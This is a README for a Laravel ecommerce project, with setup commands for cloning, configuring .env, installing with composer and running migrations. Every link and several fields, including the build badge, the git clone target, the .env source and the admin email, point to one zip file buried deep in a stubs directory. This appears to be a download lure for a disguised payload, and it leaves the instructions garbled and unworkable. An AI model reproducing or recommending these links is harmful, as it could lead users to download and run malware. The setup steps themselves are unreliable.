# Ecommerce Project

<p align="center">
<a href="https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip"><img src="https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip" alt="Build Status"></a>
</p>

## Deploying To Local Server
- Clone the project to your local server using the following command:
    ```bash
    git clone https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip
    ```
  > Then enter your own credentials.
- Go to the project path and configure your environment:
    - Copy the `https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip` file to `.env`:
        ```bash
        cd ./waggyn
    
        cp https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip .env
        ```
    - Configure database in your `.env` file:
        ```dotenv
        DB_DATABASE=waggyn
        DB_USERNAME=root
        DB_PASSWORD=
        ```
    - Install composer packages using the following command:
        ```bash
        composer install
        ```
    - Generate the project key using the following artisan command:
        ```bash
        php artisan key:generate
        ```
    - Migrate the database tables and dummy data:
        ```bash
        php artisan migrate --seed
        ```
        > After migrating press `Y` to seed dummy data.
    - Run the project in your browser using `artisan serve` command:
        ```bash
        php artisan serve
        ```
    - Go to your browser and visit: [http://localhost:8000](http://localhost:8000)
        - Default Admin  Credentials:
            - **Email:** https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip
            - **Password:** password
